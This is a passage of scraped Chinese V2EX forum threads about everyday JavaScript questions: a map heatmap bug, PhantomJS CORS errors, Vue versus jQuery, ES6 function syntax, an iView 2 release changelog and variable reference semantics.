setTimeout(()=>{ p.click() },0) 会哦", "不会，递归触发事件貌似有最大次数限制"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下，当我把显示热力图语句{  heatmapOverlay = new BMapLib.HeatmapOverlay({\"radius\": 104});\nmap.addOverlay(heatmapOverlay);\nheatmapOverlay.setDataSet({data: p4, max: 100});\nheatmapOverlay.show();  } 写到函数 show_heat_map();里后调用该函数不显示热力图，但是当我把上面的司机话写入&lt;script&gt; &lt;/script&gt;里面（也就是不用函数）时可以显示热力图，请问这是怎么回事？求指教！</p>\n<p>{% block page_content %}\n{% block scripts %}\n{{ super() }}\n&lt;script type=\"text/javascript\" src=\"{{\" url_for('static',=\"\" filename=\"js/jquery.js\" )=\"\" }}=\"\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"&amp;lt;a href=\" http:=\"\" &lt;a=\"\" href=\"http://api.map.baidu.com\" rel=\"nofollow\"&gt;api.map.baidu.com=\"\" api?v=\"2.0&amp;ak=\"\" rel=\"nofollow\"&gt;<a href=\"http://api.map.baidu.com/api?v=2.0&amp;ak=\" rel=\"nofollow\">http://api.map.baidu.com/api?v=2.0&amp;ak=</a>\"&gt;&lt;/script&gt;\n{#        热力图 js 文件#}\n&lt;script type=\"text/javascript\" src=\"{{\" url_for('static',=\"\" filename=\"js/Heatmap_min.js\" )=\"\" }}=\"\"&gt;&lt;/script&gt;</p>\n<pre><code>{% endblock %}\n\n&lt;div id=\"allmap\" style=\"width: 100%; height: 600px; float: left\"&gt;&lt;/div&gt;\n\n&lt;script&gt;\n    var map = new BMap.Map(\"allmap\"); // 关闭底图可点动能\n    map.enableScrollWheelZoom();       // 鼠标滚动缩放\n    var point = new BMap.Point(117.051534, 36.660632);\n    map.centerAndZoom(point, 16);\n\n    var points = [];\n    var p4 = [{\"lng\": 117.035278, \"lat\": 36.666162, \"count\": 99}];\n    \n\n\n    $.getJSON($SCRIPT_ROOT + '/jquery/all_loads_nodes', {}, function (data) {\n        var nodes = data.result['nodes'];\n        var loads = data.result['loads'];\n        loads.forEach(function (load) {\n            var start_id = load[0];\n            var end_id = load[1];\n            var start_lng = Number(nodes[start_id]['longitude']);\n            var start_lat = Number(nodes[start_id]['latitude']);\n            var end_lng = Number(nodes[end_id]['longitude']);\n            var end_lat = Number(nodes[end_id]['latitude']);\n            var k = (start_lat - end_lat) / (start_lng - end_lng);\n            var step = (start_lng - end_lng) / 10;\n            var flow = load[4];\n\n            for (var i = 0; i &lt;= 2; i++) {\n                var point = {\n                    \"lng\": Number((end_lng + i * step).toFixed(6)),\n                    \"lat\": Number((k * i * step + end_lat).toFixed(6)),\n                    \"count\": parseInt(flow / 150)\n                };\n                points.push(point);\n            }\n        });\n        show_heat_map();\n    });\n\n    function show_heat_map() {\n    \theatmapOverlay = new BMapLib.HeatmapOverlay({\"radius\": 104});\n    \tmap.addOverlay(heatmapOverlay);\n        heatmapOverlay.setDataSet({data: p4, max: 100});\n        heatmapOverlay.show();\n\n    }\n\n&lt;/script&gt;\n</code></pre>\n</div></div>"], "reply": "1", "tittle": "js 问题，新手求教", "comment": ["问题已经解决，链接如下： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://cloud.githubusercontent.com/assets/9573300/23447087/71d7b2bc-fe83-11e6-8d7b-7228c8b78cbe.png\"></p>\n<p>这的确是一个老生常谈的问题，而代码的运行效率也不仅仅局限于 JavaScript ，而理应上升到编程者的哲学思想。在此，不才及劣者归纳了一些 JavaScript 中提高性能的点以便记忆与实践。当然，最为重要的是能与大家一起探讨那些代码为何不够优雅的问题。若你还沉迷 PHP 是世界上最好的语言，那你就继续沉迷吧。说实话，不才只是认为语言仅仅是作为一个工具而存在，但最为重要的是你骨子里使用的想法。</p>\n<p>欢迎大家来到我的 Issue 进行交流和探讨。不局限于 JavaScript ，若您在编程中遇到一些认为可以提高性能的想法，都可以与我交流分享。</p>\n<p>23333 ，所贴图片其实挺有趣。 Just a finger snapping, can make your code impressive.</p>\n<p><a href=\"https://github.com/aleen42/PersonalWiki/issues/27\" rel=\"nofollow\">https://github.com/aleen42/PersonalWiki/issues/27</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "老生常谈：你的 JavaScript 怎么运行得这么慢？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>也许突然说到 PhantomJS 有些莫名其妙。总之就是在脚本语言里逐行读取文件内容，每读一行，就删掉原文件中的这一行。应该怎么做？</p>\n</div></div>"], "reply": "9", "tittle": "可以用 PhantomJS 逐行读取本地文件之后删除已读行么？", "comment": ["别说 JS ，用汇编也不行啊", "忘了 js 吧，你需要 python 或者 perl ，要不然 shell 也行", "为什么不全部读取后直接删除原文件后再创建一个同名的空文件呢？", "这是一个 XY 问题", " shell 脚本能完成也行，毕竟我是在终端下操作。", " 如果我的文件有 200 多 M 可以全部读取么。。", "用 node 可以……", " +1\r", "\r", "这个需求有点反文件系统啊……\r", "除非每次保存都是重写文件，那什么语言都能完成", "问题已解决，感谢各位。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>3 月 3 日 周五晚 8 点， iView 作者为您带来一场关于 iView 开源项目的直播，你关心的 iView 2.0 也会介绍哦，欢迎报名。\n直播内容：</p>\n<ul>\n<li>iView 介绍</li>\n<li>iView 生态</li>\n<li>iView 目前开发状态</li>\n<li>iView 后续计划</li>\n<li>升级到 Vue 2.x 经验谈</li>\n<li>开源心得</li>\n<li>互动，可以讨论关于 Vue 、 iView 、开源等话题</li>\n</ul>\n<p>报名地址：\n<a href=\"http://m.quzhiboapp.com/?liveId=367&amp;fromUserId=868\" rel=\"nofollow\">http://m.quzhiboapp.com/?liveId=367&amp;fromUserId=868</a>\n或用微信扫描下面二维码报名：\n<img alt=\"\" src=\"https://ooo.0o0.ooo/2017/03/02/58b77bdf5db14.png\"></p>\n<p>知识无价，报名会收取您 6.6 元费用，请量力支持！</p>\n</div></div>"], "reply": "3", "tittle": "3 月 3 日晚 8 点，来一次关于 Vue、iView、开源的直播分享", "comment": ["前排小板凳", "感觉都去看金刚狼了 选的时间不怎么好", " 可以报名后看回播"]},
{"content": ["<div class=\"topic_content\">a 、获得数据后，再去启动应用 /插件(明显只适合初始化数据)\r<br>b 、预先返回一个空对象，后续再插入\r<br>c 、魔改，使其支持 promise 或者再一个回调\r<br>d 、实现一个协程(不想吐槽了)\r<br>\r<br>就没有更好的方法了吗？</div>"], "reply": "8", "tittle": "如何在需要同步返回数据的接口中返回一个需要异步获取的数据", "comment": ["async\r", "await", " 可惜需要编译，不知道能不能编译到 es5", "es5 的话， setTimeout 递归回调吧", "能够编译到 es5 ，不过需要 regenerator-runtime （ npm 下载 babel-polyfill ，里面有这个库）兼容 geneator 函数。\r", "native-promise-only 兼容 Promise 。", "刚好也遇到这个问题,而且我是需要同步返回数据的接口中需要多个异步获取的参数.希望有不需要编译的原生解决方法..", " 目前看来 a 和 b 是最好的方法了，如果可以的话。", " 求问 setTimeout 怎么实现？", "异步逻辑是个 Monad ，不可能放在同步逻辑内执行的。\r", "最简单的方法就是接口改成返回 Promise 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>延伸问题：怎样的gc算sound？</p>\n</div></div>", "<div class=\"topic_content\">表述不太清啊，想问的是 gc 对 IDBDatabase 的回收是否可靠~</div>"], "reply": "目前尚无回", "tittle": "gc 对 IDBOpenDBRequest 的回收是否可靠？", "comment": []},
{"content": "", "reply": "44", "tittle": "即使 vue.js 再怎么好用，有些时候还是用 jQuery 解决一些问题更快捷，不知道大家有没有这种感觉", "comment": ["Vue.js 又没有限制你对 jQ 的使用……", "Vue.js 和 jQuery 本来就不是算一类东西， Vue.js 是 MVVM 框架。", "小问题可能 jquery 快点，当一个团队进行工程化开发的时候，差别就很明显了", "后端表示 jQuery 已经够用了。。。", "是时候上神图了\r", "你说说什么情景下用 jQuery 比 Vue 快捷？\r", "\r", "实在想不明白有 Vue 的情况下为啥还需要 jQuery 。", "实在想不出什么场景用到 jquery 。", "从来都是混用", "用 Vue 就用不到 jQuery 了，即使是选择器也用不到 jQuery 吧。", " 随手拉一套活动单页，显然 jQuery 比 Vue 全家桶来得合适。", "使用框架是取决于问题规模的，当问题的规模足够大，那么高级的抽象就会产生很大的收益，反之，则只会增加成本。脱离上下文的讨论没有意义。", "本身不同框架或工具有不同的适用场景，好用最多只是在某个应用场景好用啊", "你没看过尤小右那篇关于前端框架渐进式发展的文章吗？文章中就讲到，框架本身的目的就是通过用学习框架的时间和人力成本来换取开发大型项目的时间和人力成本，当这个大型项目足够大的时候，框架以及各种全家桶带给你的便利才能形成规模效应体现出来。", "一般门户站的 slide ， jQuery 的要漂亮不少，复制粘贴，就是干！", "老夫写代码只用 jquery ，就是干", " 对啊，都忘了，活动页。这倒确实是。", "不得不承认， vue 赶上 jquery 的生态圈至少还要 2 年，我选一个轮子不是因为这轮子多优秀，是这轮子的配件能给我带来多少便利\r", "\r", "幸运的是现在很多第三方组件都是 jq-free 的，但是全 vue 化不可能", "这两个又不是一样的东西，定位也不一样，干嘛拿来比", "jq 对 input 设置 val 时候...vue 双向绑定就失效了.", "我是一起用, 没办法....", "lz 不要为了框架而框架啊，你要知道这种类 mvvm 框架是用来干什么的。", "jQuery 插件多，很多页面写起来爽很多。", " \r", "\r", "所以你为啥要直接在 dom 里面对 input 设置 val ……\r", "既然已经双向绑定了，直接在 vue 里面设置才是正确方法啊", "脱离应用场景选框架都是扯淡", " 你不要设置 val ，试试 trigger input 的 inputevent", "用框架的目的是为了简化开发，要理解业务场景，拿 jQuery 来理解 Vue 、 Angular 、 React 这些框架肯定是行不通的", "大炮打蚊子", "一个是框架，一个是内裤（类库），感觉这是常见的误区。", " 哈哈，我也是一起用 涉及到 bootstrap 的时候，有些时候没办法只能用 jquery", " 当 jquery 有能直接用的插件时，，，，不过讲道理很多插件都有两个版本一个原生一个 jQuery 。当然都可以自己写，弄一些简单的页面时还是有别人插件快点，懒得自己写。", " 然而他们冲突,一起用会有各种问题.", "能被 js 重写的东西，以后都会被 js 重写\r", "能有作用的插件，都会在 vue 中被塑造", "YOU MIGHT NOT NEED JQUERY  ", "实在不行就把 jquery 插件用 vue 包成一个 component 就行了", "脱离需求谈选型都是耍流氓。", " 那个组件 没用 vue.但是有一个 vue 的组件用到它了", "vue 和 jquery 都引入就是...用了半年相安无事,希望 vue 能出个 lite 版,只有数据绑定和模板功能", "各位有没有解决 jquery 无法在 vue2 中双向绑定的栗子啊，详细点好， js 实在太菜了……", " 说出了我的想法 233", "楼主的想法是正确的， vue 确实强大， 但可惜， vue 的生态不够好， 目前来说， vue 要赶上 jquery 、赶上 angular 估计没个 2 年  还真追不上", " 这域名厉害了", " v-model 是监听 input 事件的，修改 value 以后顺便 trigger 一个 input 事件就好了", " 谢谢，我才发现还用不着 v-model"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>同样的 JavaScript 脚本文件，在我的 macOS 终端下用 PhantomJS 能正常发送请求；放到另一台同样安装了 PhantomJS 的 Ubuntu 16.04 系统下就出现这个错误</p>\n<p>XMLHttpRequest cannot load https://[website].com  <strong>Cross Origin Requests are not supported.</strong></p>\n<p>Google 了一下，有许多人出现了非常类似但是不完全相同的错误，比如</p>\n<ol>\n<li>XMLHttpRequest cannot load https://[website].com <strong>Cross origin requests are only supported for HTTP</strong></li>\n<li>XMLHttpRequest cannot load https://www.[website].com/ <strong>No 'Access-Control-Allow-Origin' header is present on the requested resource.</strong></li>\n</ol>\n<p>以上这两种错误前部分与我的是一样的，但是<strong>后半部分加粗的信息不同</strong>。 尤其是第 2 条，我添加了 <strong>Access-Control-Allow-Origin</strong> 这个 header 到我的请求头中，我的错误仍然会出现。</p>\n<p>不知道有没有有 V 友能帮忙找一下原因。</p>\n</div></div>"], "reply": "29", "tittle": "XMLHttpRequest 跨域请求(Cross Origin Request)错误", "comment": ["可以看一下 mdn 的 CORS 那页", "把 Request 和 Response 都贴下", "Allow origin 头不是请求方加的，是响应方加的。如 1 楼看看 cors 文档或教程吧。", " 就比如说\r", "//myfile.js\r", "var request = new XMLHttpRequest();\r", "request.open('GET', \"https://www.v2ex.com/\", false); //这里用同步请求，不用异步\r", "request.send();\r", "if (request.status === \"200\") {\r", "  console.log(\"Succeed!\");\r", "} else {\r", "  console.log(\"Failed!\");\r", "}\r", "在 Ubuntu 系统终端下运行 phantomjs myfile.js 结果是两行错误\r", "XMLHttpRequest cannot load ", ". Cross origin requests are not supported.\r", "NETWORK_ERROR: XMLHttpRequest Exception 101: A network error occurred in synchronous requests.\r", "\r", "但是在我的 macOS 下运行不会出错", "PhantomJS 不太清楚，我怀疑是 macOS 和 Linux 下处理跨域不一样。\r", "你可以尝试在服务端加上 CORS ，然后再试试。", "不需要，你可以改 PhantomJS 的安全性设置", "服务端， php 返回时发送：\r", "header(\"Access-Control-Allow-Origin:*\");", " 看了 3 楼才知道，我是请求端，这个 header 是服务端添加的。难怪我添加了没用。", " 我是请求端，我不能处理服务端。。怎么查看 macOS 和 Ubuntu 下的跨域设置呢？", " --debug", "jsonp", " 这个「跨域设置」是什么东西的属性？操作系统的属性还是浏览器的属性？我看 StackExchange 上很多人说如果使用 Chrome 调试出现这个 Cross-origin request not supported 错误，可以更改 Chrome 的跨域设置来解决。但是我用 PhantomJS 的话并不是什么浏览器啊。", " phantomjs --debug ？", " 在两个机器上都加上--debug=true 看看运行的各个参数是否都一样", "Allow-Control-Allow-Origin:*      ??", " 看了 3 楼才知道，我是请求端，这个 header 是服务端那边添加的。我添加了没有用。", " 我才知道 phantomjs 有--debug 这个选项，感谢。 ubuntu 下的 debug 内容的前 41 行内容与[macOS]( ", ")完全一致，从 42 行之后的内容 ubuntu 就没有了，之后就是报错（该帖中提到的那两行错误）", "跨域是服务器端的，请求方不能设置，没办法", " 可是我在 macOS 下能用 phantomjs 跑这个 js 脚本， ubuntu 就不行。肯定是 PhantomJS 的设置问题。。", "跨域看浏览器的", " 可我用的是 phantomjs 不是浏览器，连 UserAgent 都没设置。", "理论上来说， XHR 会受同源限制，不能进行跨域请求", " macOS 下使用 phantomjs 的`--web-security=no`选项可以跨过同源限制。", "试试这个\r", "\r", "--ignore-ssl-errors\r", "我感觉是 https 的原因", " \r", "我拿了你 4 楼的代码试了下，可用。需要加 --web-security=no ，环境是 centos\r", "./phantomjs --web-security=no /tmp/myfile.js", " \r", "./phantomjs -v\r", "2.1.1", " 这个 web security flag 我设置为 no 了，但在 ubuntu 下仍然给出相同的错误。 ubunu 系统是不是有毒啊！后来我放弃了 ubuntu ，重装了 windows 系统，然后用 cygwin 来跑 Linux shell 脚本。", " 我到 Linux StackExchange 问一下，也无人可解，不知道这是 Ubuntu 的原因还是 16.04 这一个版本原因，总之我放弃了。不过还是非常感谢你的帮助。", " 这个 flag 我设置过，没有效果。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>『建议在创建项目和开发 Vue 项目的时候使用 vue-cli ，在调试时使用 weex-toolkit ，在打包原生应用时使用 weex-pack』</p>\n<p>为什么开发一个 app 要这么麻烦？</p>\n</div></div>"], "reply": "1", "tittle": "有人试过 weex 吗？感觉太....", "comment": ["哈哈哈，别的还没用过，就用过 vue-cli 很方便啊怎么会麻烦 :) 不过一开始一堆工具一堆概念是比较晕。创造工具就是为了简化工序，同时又引入了学习成本，这是永远无法调和的矛盾 :)"]},
{"content": "", "reply": "1", "tittle": "在其它的宿主环境中有哪些类似于 window 的全局对象？", "comment": ["global"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这两天在看 JavaScript 语言精粹,作者 Douglas Crockford,看的没啥感觉,没有那种,我靠,还能这样,或者,原来是这样一类的醍醐灌顶,不知是看的不仔细,还是功力不够,有看过的猿们,来谈谈你们的感受。分享交流下.</p>\n</div></div>"], "reply": "21", "tittle": "看过 JavaScript 语言精粹的猿们,来谈下感受.", "comment": ["你想要的那种效果建议看《你不知道的 JavaScript 》、《 JavaScript 忍者秘籍》之类的。", "试试《 Javascript 模式》和《 Javascript 设计模式》", "老实说，这本书有点旧了，说的还是 ES3 的东西，而 ES3 - ES6 的改变真的很大，很多书里谈的东西，例如函数继承方面的，使用 ES6 可以以轻松易懂的形式表达出来。\r", "\r", "我觉得看不看都可以。", "看 《你不知道的 JavaScript 》吧，给你醍醐灌顶的感受", "书中点很多，当个提纲看吧，每个点都可以扩展开，后面的规范还不错，中文版翻译 给的 提示代码什么的有 bug ， 可以自己改改；\r", "另外就像上面说的，基于 ES 3 ， 没有对新语法的理解，也有些说法过时", "因为 js 已经普及的差不多了，你平时都接触过书中写的点。", "我觉得这本书更适合没有系统学习过 JavaScript ，但又需要快速上手的人，而且这本书比较旧了，没有跟进 ES2015 。如果你已经通过其他的书系统地学习过了，或者已经有很多 JavaScript 的编码经验的话，可能帮助不大，这种情况推荐看「你不知道的 JavaScript 」（最近下册也出中文版了），还可以看看我的推荐书单 ", "感受就是， js 里面有很多“烂”的地方，叫做糟粕，忽略它，用精华。", " \r", "根据这个人的回答,Douglas Crockford 的书还是不要看了\r", "评论里面.\r", "\r", "\"哈哈哈，最近看了 DC 的新演讲 the better parts ，越发觉得他就是根搅屎棍...\"\r", "                                                                                        -- 尤雨溪", " 没看到\"哈哈哈，最近看了 DC 的新演讲 the better parts ，越发觉得他就是根搅屎棍...\" 这句啊，他删了么，而且本身整个回答写的不错啊", " 这个是在上面链接的回复里面", " 这本书简直是神书，我当时激动的甚至想要把每段话都抄下来", " 对对对，讲理特别清晰易懂，甚至对学习其他语言也有帮助。", " 好的!", " 设计模式,最近也是准备系统学,谢谢推荐!", " 好的,谢谢你的书单!", "说点别的，我 oop 是从 js 学来的。\r", "为什我这里用别的语言就能继承， js 就要复制粘贴，瞬间明白 oop 。", "点了很多坑 点了很多亮点 你就应该按照这本书的东西作为准则来写 它不是增加什么醍醐灌顶的东西 它只是帮你筛选亮点而已 过滤你学过的繁杂的东西 帮你肯定它值得信任的部分 指出这门语言设计的缺陷和亮点 你再看 es6 就是在弥补缺陷和一些你所谓醍醐灌顶的东西", "这本书里都是非常非常基础的东西，但是讲得非常好，我一般是把它作为入门书推荐。", "effective JavaScript 也不错的\r", "基础是基础，不过我相信多数写 JavaScript 的人都是没了解过 JavaScript 的基础就开始写了", " JavaScript 的 prototype based OOP 比 class based OOP 更贴近 OOP :)"]},
{"content": "", "reply": "6", "tittle": "Why javascript?", "comment": ["Why post?", "why not js", "WTF?", "why not zoidberg", "你这帖子水得可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>需求以及说明</h2>\n<p>网址： <a href=\"http://app.guazipai.com/#!/detail/485132?from=list&amp;source=listtab\" rel=\"nofollow\">http://app.guazipai.com/#!/detail/485132?from=list&amp;source=listtab</a></p>\n<p>在登陆的情况下点击「参与竞拍」，会发出一个请求，请求中有一个 bread 参数，我想知道生成逻辑，由于对 js 这块不是特别懂，只能大概找到生成参数的位置，但怎么提取出来使用，就一脸懵逼了，请教一下各位熟悉 JS 这块的同学，能实现的同学，可以联系我企鹅号： 2423891370</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/654e1794gy1fdj08hwdtej20f903et8x\">\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/654e1794gy1fdj0emi99zj20oi0blgnm\">\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/654e1794gy1fdj0emtfdhj20ml0c4jt7\">\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/654e1794gy1fdj0emg6ovj20vt0jr0w2\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "500 块求助提取一段 token 生成代码", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以前见到过,忘记保存了\n随意拖动鼠标可以自动生成对称的黑色背景图像. 类似天使的翅膀. 可以作为桌面的那种\n好像是个 apple app 的应用. 不过有网页的 好像是 javascript 实现.</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "求一个拖动鼠标可以自动生成对称图像的炫酷网站.", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 ES5 中，我经常用函数申明 function declaration 来申明函数</p>\n<pre><code>function myFunc() {}\n</code></pre>\n<p>这样的好处是我可以把函数的实现写在最下方，这样让程序更易读，看了前面就知道大概逻辑了，如果需要再往下看具体的小函数的实现</p>\n<pre><code>doSomething();\ndoSomethingElse();\n\nfunction doSomething() {}\nfunction doSomethingElse() {}\n</code></pre>\n<p>如果用 function expression 的话，就需要将 expression 写在调用的前面</p>\n<pre><code>var doSomething = function() {}\nvar doSomethingElse = function() {}\n\ndoSomething();\ndoSomethingElse();\n</code></pre>\n<p>但 ES6 中好像只支持 function declaration 了...</p>\n<pre><code>let doSomething = ()=&gt; {}\n</code></pre>\n</div></div>"], "reply": "16", "tittle": "ES6 中没有函数申明的语法了吗？", "comment": ["有的啊， () => {} 是新功能，不是替代旧功能。\r", "\r", "而且 () => {} 函数和 function () {} 的含义也不一样，是两种用途", "哦哦，表达不是特别清楚， ES6 中可以用之前一样的语法来 function declaration ，我想问的是，在 ES6 中有什么简便的语法来做 function declaration 吗？", "ES2015 兼容 ES5 ， function a() {} 还是他原来的意思\r", "\r", "var a = function (){}  a 声明提前，但赋值是到运行这条语句的时候才会赋值， ES5\r", "\r", "let a = () => {}  首先 let 是声明不会提前，其次赋值也是到运行这条语句的时候才会赋值 ，箭头函数 /let 是 ES2015 新增内容\r", "\r", "var a = () => {}  那和你说的 var a = function(){} 才类似呢", "我觉得应该没有？有的话请楼下 at 我，谢谢！", "ES6 的 arrow function 不是用来“取代” ES5 的普通函数的，其设计初衷是简化 lambda expression 的写法。\r", "所以，不要想当然地恨不得把所有的 function declaration 都换成 arrow function 。该用 function declaration 时还得老老实实地用 function declaration 。", " 没有简便语法，和原来一样。\r", "\r", "箭头函数的 this 是外部的 this ，这个在 callback 的场景非常明显！不用保存上级的 this 引用。\r", "\r", "当然特定时候也有必须要用 this 就不能用箭头函数了。", "arrow function == (function () {}).bind(this)", "function () {} 已经很简单了吧", "在对象字面量和 class 中声明函数属性，可以直接括号，不需要 function 关键字。所以大部分场合 function 关键字是可以被干掉了。", " 请问你指的是这样写吗？也不需要 let 和 const ？`something = () => { }`", " 说的是 ", "es6 加了个在字面量定义函数的功能也挺方便\r", "\r", "+{ a() {} }.a()", "噗，才看到上面已经说了", "严格来说叫 lambda\r", "实现上来说箭头函数是匿名函数\r", "都叫做匿名函数了，何来声明？", "其实现在很多人的习惯是写 const f = () => 0 这样的，我也不知道为什么，可能是不喜欢声明提前吧", "现在的（）=> {}比以前方便了啊，要是还是 function declaration 就继续用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://ooo.0o0.ooo/2017/03/10/58c20faf45e2c.png\"></p>\n<h1>iView2 来了</h1>\n<p>两个星期的紧张开发， iView 终于发布了支持 Vue.js 2.x 的 2.0.0-rc.1 版本。\n该版本以 iView 1.x 为基础进行修改，完全保留了 43 个 UI 组件，针对 Vue 2.x 的特性，对一些 API 进行了调整，比如表单类组件充分利用 v-model 来替代 .sync 。整体性能也大幅度提升。\n<strong>2.0 版本地址(已将 2.0 分支更改为默认分支， 1.0 在 master)：</strong>\n<a href=\"https://github.com/iview/iview\" rel=\"nofollow\">https://github.com/iview/iview</a></p>\n<h1>iView 2 开发实践</h1>\n<p>我们会在 <strong>3 月 23 日晚 8 点</strong> 在 segmentfault 直播关于 iView 2 的组件开发实践，进一步介绍在升级过程中的开发经验和对部分组件的分析，偏干货。\n报名费用： 1 元，报名地址：\n<a href=\"https://segmentfault.com/l/1500000008614960\" rel=\"nofollow\">https://segmentfault.com/l/1500000008614960</a>\n微信扫描二维码：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/92119aed184cd0d59cce.png\"></p>\n<h1>更新日志</h1>\n<p>目前已发布至 npm ， 2.0 文档还需一段时间，但很快会发布新版本的 iView Cli 来支持 iView 2 。以下是一些升级中的日志线索，如有任何问题，欢迎到 GitHub 提交 issues ：</p>\n<h3>Button</h3>\n<p>需使用 @click.native</p>\n<h3>Input</h3>\n<p>使用 v-model ，增加 on-input-change // todo 考虑更名</p>\n<h3>RadioGroup</h3>\n<p>使用 v-model</p>\n<h3>Radio</h3>\n<p>value 改为了 label ，使用 v-model ，废弃 checked</p>\n<h3>Checkbox</h3>\n<p>使用 v-model</p>\n<h3>CheckboxGroup</h3>\n<p>value 改为了 label ，使用 v-model ，废弃 checked</p>\n<h3>Switch</h3>\n<p>废弃 checked ， 改为了 value ，使用 v-model</p>\n<h3>Badge</h3>\n<p>class 改为了 className</p>\n<h3>InputNumber</h3>\n<p>使用 v-model</p>\n<h3>Progress (名称有警告)</h3>\n<p>新增 on-status-change 事件</p>\n<h3>Upload</h3>\n<p>父级不能 computed Upload 的 fileList 了</p>\n<h3>Collapse</h3>\n<p>废弃 activeKey ，使用 v-model ， key 是保留的，更名为 name</p>\n<h3>Carousel</h3>\n<p>废弃 activeIndex ，使用 v-model ， v-for=\"n in slides.length\",Vue2 的数字循环，是从 1 开始的</p>\n<h3>Tree</h3>\n<p>废弃 data ，改为 value ，使用 v-model ， key 更名为 name ，不能再 template 的 prop 上使用 this</p>\n<h3>Circle</h3>\n<p>改名为 iCircle</p>\n<h3>Tabs</h3>\n<p>废弃 activeKey ，改用 value ，使用 v-model ， key 更名为 name</p>\n<h3>popper.js 将 prop: visible 移至 data 里</h3>\n<h3>Slider</h3>\n<p>支持 v-model</p>\n<h3>Dropdown</h3>\n<p>DropdownItem key 改为 name, Dropdown 的 visible 要使用 @on-visible-change 捕获，不再 sync\nDropdownItem 里， this.$parent.$parent 与 1.0 有区别</p>\n<h3>Menu</h3>\n<p>MenuItem 和 Submenu 的 key 改为了 name\nMenu 的 activeKey 改为 activeName,openKeys 改为 openNames</p>\n<h3>Cascader</h3>\n<p>Caspanel 的 sublist 从 prop -&gt; data</p>\n<h3>Select</h3>\n<p>model 改为 value ，支持 v-model</p>\n<h3>Page</h3>\n<p>class 改为 className</p>\n<h3>DatePicker</h3>\n<p>使用 v-model</p>\n<h3>LoadingBar</h3>\n<p>部分 prop 移至 data</p>\n<h3>Modal</h3>\n<p>visible 改为 value ，使用 v-model ， style 改为 styles ，$Modal 的关闭有改动，建议后面在纯 html 模式下测试</p>\n<h3>Table</h3>\n<p>i-table 改为 Table ，目前单元格渲染自定义组件还有部分 bug</p>\n<h3>Message</h3>\n<p>notice.vue 的 key 改为了 name ， style 改为 styles\nnotification.vue 的 key 改为了 name ， style 改为 styles</p>\n</div></div>"], "reply": "31", "tittle": "iView2 来了，全面支持 Vue.js 2.x", "comment": ["支持一个,终于出了~", "昨天还在看 1.0 的...", "这就要在 iview 和 element 中间选了，哪位大佬推荐或者评价一下这两个。", "已报名。", "帮顶群主", "以支持，已报名；", "马一个", "支持", "支持+1", "选谁比较好呢", "已报名!支持作者!", "支持支持", "感觉和 ant-design 很像呀，文档风格都一样的\r", "赞个", "mark 下~~", "好支持顶 ", "   ", "   ", " ", " #13  ", " ", " 哈哈，原来如此", "很漂亮👍", "cli 好像还没更新", "酷", "细节处理还是比 element 好，准备使用。", "网站在手机上打开有点惨不忍睹", " 是的， iView 主要服务 PC ，没有做移动端的兼容", " 求更新 cli", "昨天才对比了饿了么和 iview 最后因为不支持 2.0 选了饿了么。。。今天你就出来 2.0 ", " ", " 下周会更新 iView Cli", " 所以现在换还来得及🙄", "关注很久了!支持", "刚才把所有的组件基本都看了一遍，挻 cool ，对 pc 、移动端兼容怎么样？", "支持!", "支持"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var index = {\n    data: 10\n};\nfunction par() {\n    function fun(i) {\n        index = 15;\n        console.log(i.data + ' ' + index);\n    }\n    fun(index);\n}\npar();\nconsole.log(index);\n</code></pre>\n<p>输出 10 15\\n15</p>\n<p>问题是，在 fun 内部不是已经改变全局变量 index 的值了吗，为什么 i.data 还能输出原来的值？</p>\n</div></div>"], "reply": "5", "tittle": "关于变量赋值的小问题", "comment": ["赋值 15 改变的是变量 index 这个指针，原来的对象还在， fun(index)是把 index 变量指向的对象传进去。", "注意执行顺序，在改变 index 之前，已经先执行了 i = index", "此 index 非彼 index", "因为 i != index", "js 函数传参永远都是值传递，如果参数是对象的话，传的是对象引用的内存地址。\r", "你的问题里 i 指向的是一开始 index 的内存地址，后面执行的 index=15 让 index 指向了新的地址，但是 i 还是指向最初的地址。\r", "如果 index=15 改成 index.data=15 的话，那么 i 会跟着一起变。\r", "\r", "参考 ", "\r", "\r", "Javascript is always pass by value, but when a variable refers to an object (including arrays), the \"value\" is a reference to the object.\r", "\r", "Changing the value of a variable never changes the underlying primitive or object, it just points the variable to a new primitive or object.\r", "\r", "However, changing a property of an object referenced by a variable does change the underlying object."]},
